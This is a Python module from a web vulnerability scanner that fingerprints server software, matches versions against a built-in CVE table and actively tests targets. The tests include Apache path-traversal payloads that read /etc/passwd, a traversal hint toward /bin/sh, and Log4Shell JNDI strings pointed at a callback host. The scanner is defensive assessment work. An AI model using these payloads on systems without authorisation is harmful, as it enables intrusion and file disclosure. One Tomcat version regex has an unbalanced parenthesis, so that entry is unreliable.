import re
from urllib.parse import urljoin

from scanner.core import Finding, Severity, ScanSession

# Built-in vulnerability database: maps (software_lower, version_prefix) to list of CVE entries.
# Each entry: (cve_id, affected_versions_regex, cvss, severity, summary, exploit_available)
VULN_DB = {
    "apache": [
        ("CVE-2021-41773", r"^2\.4\.49$", 7.5, "HIGH",
         "Path traversal and file disclosure in Apache HTTP Server 2.4.49", True),
        ("CVE-2021-42013", r"^2\.4\.(49|50)$", 9.8, "CRITICAL",
         "Path traversal and RCE in Apache HTTP Server 2.4.49-2.4.50 (incomplete fix for CVE-2021-41773)", True),
        ("CVE-2021-44790", r"^2\.4\.(5[01]|4[0-9])$", 9.8, "CRITICAL",
         "Buffer overflow in mod_lua multipart parser in Apache HTTP Server <2.4.52", True),
        ("CVE-2022-22720", r"^2\.4\.(5[0-2]|4[0-9])$", 9.8, "CRITICAL",
         "HTTP request smuggling in Apache HTTP Server <2.4.53", False),
        ("CVE-2022-31813", r"^2\.4\.(5[0-3]|4[0-9])$", 9.8, "CRITICAL",
         "mod_proxy X-Forwarded-For bypass in Apache HTTP Server <2.4.54", False),
        ("CVE-2023-25690", r"^2\.4\.(5[0-5]|4[0-9])$", 9.8, "CRITICAL",
         "HTTP request smuggling in Apache mod_proxy <2.4.56", True),
    ],
    "nginx": [
        ("CVE-2021-23017", r"^(0\.|1\.([0-9]\.|1[0-9]\.|20\.[0-1]$))", 9.4, "CRITICAL",
         "DNS resolver off-by-one heap write vulnerability in Nginx <1.20.1", True),
        ("CVE-2022-41741", r"^1\.(2[0-2]\.|23\.0$)", 7.8, "HIGH",
         "Memory corruption in Nginx mp4 module <1.23.2", False),
        ("CVE-2022-41742", r"^1\.(2[0-2]\.|23\.0$)", 7.5, "HIGH",
         "Memory disclosure in Nginx mp4 module <1.23.2", False),
    ],
    "php": [
        ("CVE-2019-11043", r"^7\.[12]\.", 9.8, "CRITICAL",
         "PHP-FPM RCE via env_path_info underflow (PHP 7.1.x-7.3.x)", True),
        ("CVE-2023-3824", r"^8\.[01]\.", 9.8, "CRITICAL",
         "Buffer overflow in PHP phar reading (PHP <8.0.30, <8.1.22)", True),
        ("CVE-2024-4577", r"^8\.[0-3]\.", 9.8, "CRITICAL",
         "PHP CGI argument injection on Windows (PHP <8.1.29, <8.2.20, <8.3.8)", True),
        ("CVE-2022-31625", r"^(7\.4|8\.0)\.", 8.1, "HIGH",
         "Use-after-free in pg_query_params (PHP 7.4.x, 8.0.x)", False),
    ],
    "wordpress": [
        ("CVE-2022-21661", r"^5\.[0-8]\.", 7.5, "HIGH",
         "SQL injection via WP_Query in WordPress <5.8.3", True),
        ("CVE-2023-2745", r"^6\.[0-2]\.", 5.4, "MEDIUM",
         "Directory traversal in WordPress <6.2.1", False),
        ("CVE-2022-43504", r"^(5\.|6\.0)", 5.3, "MEDIUM",
         "CSRF bypass in WordPress <6.0.3", False),
    ],
    "jquery": [
        ("CVE-2020-11022", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.|^3\.4\.", 6.1, "MEDIUM",
         "XSS via passing HTML from untrusted input to jQuery DOM manipulation (jQuery <3.5.0)", True),
        ("CVE-2020-11023", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.|^3\.4\.", 6.1, "MEDIUM",
         "XSS via passing HTML containing <option> elements to jQuery (jQuery <3.5.0)", True),
        ("CVE-2019-11358", r"^[12]\.|^3\.0\.|^3\.1\.|^3\.2\.|^3\.3\.", 6.1, "MEDIUM",
         "Prototype pollution in jQuery.extend (jQuery <3.4.0)", True),
    ],
    "openssl": [
        ("CVE-2022-0778", r"^(1\.0\.|1\.1\.1[a-n]$|3\.0\.[0-1]$)", 7.5, "HIGH",
         "Infinite loop in BN_mod_sqrt causing DoS in OpenSSL", True),
        ("CVE-2022-3602", r"^3\.0\.[0-6]$", 7.5, "HIGH",
         "X.509 email address buffer overflow in OpenSSL 3.0.x <3.0.7 (Spooky SSL)", True),
        ("CVE-2023-0286", r"^(1\.0\.|1\.1\.1[a-t]$|3\.0\.[0-7]$)", 7.4, "HIGH",
         "X.400 address type confusion in OpenSSL", False),
    ],
    "tomcat": [
        ("CVE-2022-42252", r"^(8\.5\.[0-7][0-9]$|9\.0\.[0-5][0-9]$|10\.0\.", 7.5, "HIGH",
         "Request smuggling via invalid Content-Length in Apache Tomcat", False),
        ("CVE-2023-28708", r"^(8\.5\.[0-8][0-5]|9\.0\.[0-7][0-1]|10\.1\.[0-4]$)", 7.5, "HIGH",
         "Information disclosure via missing Secure attribute on session cookie in Tomcat", False),
        ("CVE-2024-21733", r"^(8\.5\.[0-9][0-7]|9\.0\.[0-8][0-3])", 5.3, "MEDIUM",
         "Information leak via incomplete POST requests in Tomcat", False),
    ],
    "spring": [
        ("CVE-2022-22965", r".*", 9.8, "CRITICAL",
         "Spring4Shell: RCE via data binding on JDK 9+ with Apache Tomcat", True),
        ("CVE-2022-22963", r".*", 9.8, "CRITICAL",
         "RCE in Spring Cloud Function via routing-expression header", True),
    ],
    "log4j": [
        ("CVE-2021-44228", r"^2\.(0|1[0-4]($|\.))", 10.0, "CRITICAL",
         "Log4Shell: RCE via JNDI lookup injection in Apache Log4j2 <2.15.0", True),
        ("CVE-2021-45046", r"^2\.1[5-5]($|\.)", 9.0, "CRITICAL",
         "Incomplete fix for Log4Shell, RCE in certain non-default configs in Log4j2 <2.16.0", True),
        ("CVE-2021-45105", r"^2\.1[0-6]($|\.)", 7.5, "HIGH",
         "DoS via uncontrolled recursion in Log4j2 lookup evaluation <2.17.0", True),
    ],
}

# Paths to probe for technology fingerprinting
PROBE_PATHS = [
    ("/wp-login.php", "wordpress"),
    ("/wp-admin/", "wordpress"),
    ("/administrator/", "joomla"),
    ("/user/login", "drupal"),
    ("/manager/html", "tomcat"),
    ("/actuator/info", "spring"),
    ("/actuator/health", "spring"),
    ("/elmah.axd", "asp.net"),
    ("/server-status", "apache"),
    ("/server-info", "apache"),
]

# Regex patterns for extracting software versions from response content
VERSION_PATTERNS = [
    (r'<meta[^>]*generator[^>]*content=["\']WordPress\s+([\d.]+)', "wordpress"),
    (r'<meta[^>]*generator[^>]*content=["\']Joomla!\s+([\d.]+)', "joomla"),
    (r'<meta[^>]*generator[^>]*content=["\']Drupal\s+([\d.]+)', "drupal"),
    (r'jquery[.-]?([\d.]+)(?:\.min)?\.js', "jquery"),
    (r'jquery/?([\d.]+)', "jquery"),
    (r'jQuery\s+v?([\d.]+)', "jquery"),
    (r'Bootstrap\s+v?([\d.]+)', "bootstrap"),
    (r'<meta[^>]*generator[^>]*content=["\']([^"\']+)', "_generator"),
]


def _normalize_software(name: str) -> str:
    """Normalize software name to match VULN_DB keys."""
    name = name.lower().strip()
    if "apache" in name and ("httpd" in name or "http server" in name or "/" in name):
        return "apache"
    if "nginx" in name:
        return "nginx"
    if "php" in name:
        return "php"
    if "wordpress" in name or "wp" == name:
        return "wordpress"
    if "jquery" in name:
        return "jquery"
    if "openssl" in name:
        return "openssl"
    if "tomcat" in name:
        return "tomcat"
    if "spring" in name:
        return "spring"
    if "log4j" in name:
        return "log4j"
    return name


def _extract_version(value: str) -> str:
    """Extract a version number from a header value or string."""
    match = re.search(r'[\d]+(?:\.[\d]+)+', value)
    return match.group(0) if match else ""


def _check_vuln_db(software: str, version: str) -> list:
    """Check the built-in vulnerability database for matching CVEs."""
    key = _normalize_software(software)
    if key not in VULN_DB:
        return []
    matches = []
    for cve_id, ver_regex, cvss, sev, summary, exploit_avail in VULN_DB[key]:
        if version and re.match(ver_regex, version):
            matches.append((cve_id, cvss, sev, summary, exploit_avail))
    return matches


def _build_curl(method: str, url: str, headers: dict = None) -> str:
    from scanner.core import build_curl
    return build_curl(method, url, headers=headers)


def _fingerprint_from_headers(resp) -> dict:
    """Extract software+version from response headers. Returns {software: version}."""
    detected = {}
    server = resp.headers.get("Server", "")
    if server:
        for pattern, sw in [
            (r'Apache/([\d.]+)', "apache"),
            (r'nginx/([\d.]+)', "nginx"),
            (r'Microsoft-IIS/([\d.]+)', "iis"),
            (r'Tomcat/([\d.]+)', "tomcat"),
            (r'LiteSpeed', "litespeed"),
        ]:
            m = re.search(pattern, server, re.IGNORECASE)
            if m:
                ver = m.group(1) if m.lastindex else ""
                detected[sw] = ver

    powered_by = resp.headers.get("X-Powered-By", "")
    if powered_by:
        for pattern, sw in [
            (r'PHP/([\d.]+)', "php"),
            (r'ASP\.NET', "asp.net"),
            (r'Express', "express"),
            (r'Servlet/([\d.]+)', "servlet"),
        ]:
            m = re.search(pattern, powered_by, re.IGNORECASE)
            if m:
                ver = m.group(1) if m.lastindex else ""
                detected[sw] = ver

    # OpenSSL from Server header
    m = re.search(r'OpenSSL/([\d.]+\w*)', server)
    if m:
        detected["openssl"] = m.group(1)

    return detected


def _fingerprint_from_body(body: str) -> dict:
    """Extract software+version from response body."""
    detected = {}
    for pattern, sw in VERSION_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            if sw == "_generator":
                gen = m.group(1).strip()
                sw_name = gen.split()[0].lower() if gen else ""
                ver = _extract_version(gen)
                if sw_name:
                    detected[sw_name] = ver
            else:
                detected[sw] = m.group(1)
    return detected


def _fingerprint_from_cookies(cookies) -> dict:
    """Detect technologies from cookie names."""
    detected = {}
    cookie_map = {
        "PHPSESSID": "php",
        "JSESSIONID": "tomcat",
        "ASP.NET_SessionId": "asp.net",
        "laravel_session": "laravel",
        "csrftoken": "django",
        "wp-settings": "wordpress",
    }
    for cookie in cookies:
        name = cookie.name if hasattr(cookie, 'name') else str(cookie)
        for cookie_prefix, sw in cookie_map.items():
            if name.startswith(cookie_prefix):
                detected[sw] = ""
    return detected


def _test_cve_2021_41773(session: ScanSession) -> bool:
    """Actively test for Apache path traversal CVE-2021-41773."""
    traversal_paths = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]
    for path in traversal_paths:
        url = urljoin(session.config.target, path)
        resp = session.get(url, allow_redirects=False)
        if resp and resp.status_code == 200 and re.search(r'root:.*:0:0:', resp.text):
            return True
    return False


def _test_log4shell_indicators(session: ScanSession) -> list:
    """Test for Log4Shell by injecting JNDI lookup patterns in common headers.
    Returns list of headers that did not get rejected (potential indicators)."""
    indicators = []
    # We use a benign callback-free payload to detect if the server processes
    # JNDI strings without triggering actual exploitation
    test_payload = "${jndi:ldap://127.0.0.1/test}"
    log4j_headers = [
        "X-Forwarded-For",
        "User-Agent",
        "Referer",
        "X-Api-Version",
        "Accept-Language",
    ]
    baseline = session.get(session.config.target)
    if not baseline:
        return []
    baseline_status = baseline.status_code

    for header in log4j_headers:
        resp = session.get(
            session.config.target,
            headers={header: test_payload}
        )
        if resp is None:
            # Connection timeout/error may indicate the server attempted the lookup
            indicators.append((header, "connection_error"))
        elif resp.status_code >= 500 and baseline_status < 500:
            indicators.append((header, f"status_{resp.status_code}"))
    return indicators


def run(session: ScanSession) -> None:
    print("\n[*] Checking for known CVEs and vulnerabilities...")

    target = session.config.target
    resp = session.get(target)
    if not resp:
        print("  [-] Could not reach target, skipping CVE checks")
        return

    # Phase 1: Fingerprint technologies from all sources
    all_detected = {}  # {software: version}

    header_tech = _fingerprint_from_headers(resp)
    all_detected.update(header_tech)

    body_tech = _fingerprint_from_body(resp.text)
    all_detected.update(body_tech)

    cookie_tech = _fingerprint_from_cookies(resp.cookies)
    # Only add cookie-based detections if we did not already find a version
    for sw, ver in cookie_tech.items():
        if sw not in all_detected:
            all_detected[sw] = ver

    # Phase 2: Probe common paths for additional fingerprinting
    for path, tech in PROBE_PATHS:
        url = urljoin(target, path)
        probe_resp = session.get(url, allow_redirects=False)
        if probe_resp and probe_resp.status_code in (200, 301, 302, 401, 403):
            if tech not in all_detected:
                all_detected[tech] = ""
            # Try to extract version from probe response
            if probe_resp.status_code == 200:
                probe_tech = _fingerprint_from_body(probe_resp.text)
                for sw, ver in probe_tech.items():
                    if ver and (sw not in all_detected or not all_detected[sw]):
                        all_detected[sw] = ver

    if all_detected:
        tech_str = ", ".join(
            f"{sw} {ver}" if ver else sw for sw, ver in all_detected.items()
        )
        print(f"  [+] Detected technologies: {tech_str}")
    else:
        print("  [-] No technologies fingerprinted")

    # Phase 3: Check all detected technologies against the vulnerability DB
    for software, version in all_detected.items():
        matches = _check_vuln_db(software, version)
        for cve_id, cvss, sev_str, summary, exploit_avail in matches:
            severity = Severity.CRITICAL if sev_str == "CRITICAL" else Severity.HIGH if sev_str == "HIGH" else Severity.MEDIUM
            exploit_note = "Public exploits are available." if exploit_avail else "No public exploit known at time of database entry."

            session.add_finding(Finding(
                title=f"{cve_id}: {summary}",
                severity=severity,
                description=(
                    f"The target appears to run {software} version {version or 'unknown'}. "
                    f"This version is affected by {cve_id} (CVSS {cvss}). {summary}. {exploit_note}"
                ),
                evidence=f"Detected: {software}/{version or 'unversioned'} via header/body fingerprinting",
                remediation=f"Update {software} to the latest stable version. Review {cve_id} advisory for specific patched versions.",
                url=target,
                module="cve_check",
                cwe="CWE-1035",  # OWASP Using Components with Known Vulnerabilities
                confirmed=False,
                detection_method=f"Version fingerprinting matched against built-in CVE database (CVSS {cvss})",
                curl_command=_build_curl("GET", target),
                reproduction_steps=(
                    f"1. Send GET request to {target}\n"
                    f"2. Observe Server/X-Powered-By headers or body content indicating {software} {version}\n"
                    f"3. Cross-reference version against {cve_id} affected versions\n"
                    f"4. {'Exploit code is publicly available - verify exploitability' if exploit_avail else 'Verify by checking installed version on the server'}"
                ),
                developer_fix=(
                    f"Update {software} to the latest patched version. "
                    f"Remove version information from Server and X-Powered-By headers to reduce exposure. "
                    f"Implement a vulnerability management process for tracking CVEs in dependencies."
                ),
                references=(
                    f"https://nvd.nist.gov/vuln/detail/{cve_id}, "
                    f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_id}"
                ),
                affected_component=f"{software} {version}",
            ))

    # Phase 4: Active CVE testing

    # Test CVE-2021-41773 / CVE-2021-42013 path traversal
    if "apache" in all_detected:
        if _test_cve_2021_41773(session):
            traversal_url = urljoin(target, "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
            session.add_finding(Finding(
                title="CVE-2021-41773: Apache Path Traversal - CONFIRMED",
                severity=Severity.CRITICAL,
                description=(
                    "The Apache HTTP Server is vulnerable to path traversal via CVE-2021-41773. "
                    "An attacker can read arbitrary files on the server outside the document root. "
                    "If mod_cgi is enabled, this can lead to remote code execution."
                ),
                evidence="Successfully read /etc/passwd via path traversal payload",
                remediation="Immediately update Apache HTTP Server to 2.4.51 or later. As a workaround, ensure 'Require all denied' is set for filesystem directories outside the document root.",
                url=traversal_url,
                module="cve_check",
                cwe="CWE-22",
                confirmed=True,
                payload="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                detection_method="Active exploitation: sent path traversal payload and verified /etc/passwd content in response",
                curl_command=_build_curl("GET", traversal_url),
                reproduction_steps=(
                    f"1. Send: curl -k '{traversal_url}'\n"
                    "2. Observe /etc/passwd content in the response body\n"
                    "3. Test with /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh for RCE if mod_cgi is enabled"
                ),
                developer_fix=(
                    "1. Update Apache to version 2.4.51 or later immediately\n"
                    "2. Add 'Require all denied' for directories outside document root in httpd.conf\n"
                    "3. Disable mod_cgi if not required\n"
                    "4. Implement a WAF rule to block encoded path traversal sequences"
                ),
                references=(
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-41773, "
                    "https://httpd.apache.org/security/vulnerabilities_24.html, "
                    "https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773"
                ),
                affected_component=f"Apache {all_detected.get('apache', '')}",
            ))

    # Test for Log4Shell indicators
    log4j_indicators = _test_log4shell_indicators(session)
    if log4j_indicators:
        affected_headers = ", ".join(f"{h} ({reason})" for h, reason in log4j_indicators)
        session.add_finding(Finding(
            title="Potential Log4Shell (CVE-2021-44228) Indicators Detected",
            severity=Severity.HIGH,
            description=(
                "The server exhibited anomalous behavior when JNDI lookup strings were "
                "injected in HTTP headers, which may indicate vulnerability to Log4Shell "
                f"(CVE-2021-44228). Affected headers: {affected_headers}. "
                "This finding requires manual verification with an out-of-band callback server."
            ),
            evidence=f"Anomalous responses when injecting JNDI payloads in headers: {affected_headers}",
            remediation=(
                "Update Log4j to version 2.17.1 or later. As immediate mitigations: "
                "set log4j2.formatMsgNoLookups=true, remove JndiLookup class from classpath, "
                "or upgrade to Java 8u191+ which restricts LDAP JNDI by default."
            ),
            url=target,
            module="cve_check",
            cwe="CWE-917",
            confirmed=False,
            detection_method="Injected JNDI lookup strings in HTTP headers and observed anomalous server behavior (errors/timeouts vs baseline)",
            curl_command=_build_curl("GET", target, {"X-Forwarded-For": "${jndi:ldap://CALLBACK_SERVER/test}"}),
            reproduction_steps=(
                "1. Set up an out-of-band callback server (e.g., Burp Collaborator, interact.sh)\n"
                "2. Send: curl -k -H 'X-Forwarded-For: ${jndi:ldap://YOUR_CALLBACK/test}' " + f"'{target}'\n"
                "3. Repeat with headers: User-Agent, Referer, X-Api-Version\n"
                "4. Monitor callback server for DNS/LDAP connections from the target"
            ),
            developer_fix=(
                "1. Immediately update all Log4j 2.x instances to 2.17.1+\n"
                "2. Set -Dlog4j2.formatMsgNoLookups=true as JVM argument\n"
                "3. Remove the JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n"
                "4. Implement WAF rules to block ${jndi: patterns in all input\n"
                "5. Audit all Java applications for Log4j usage including transitive dependencies"
            ),
            references=(
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228, "
                "https://logging.apache.org/log4j/2.x/security.html, "
                "https://www.lunasec.io/docs/blog/log4j-zero-day/"
            ),
            affected_component="Log4j (suspected)",
        ))

    # Summary
    found_count = sum(
        1 for f in session.findings if f.module == "cve_check"
    )
    print(f"  [*] CVE check complete: {found_count} potential vulnerabilities identified")
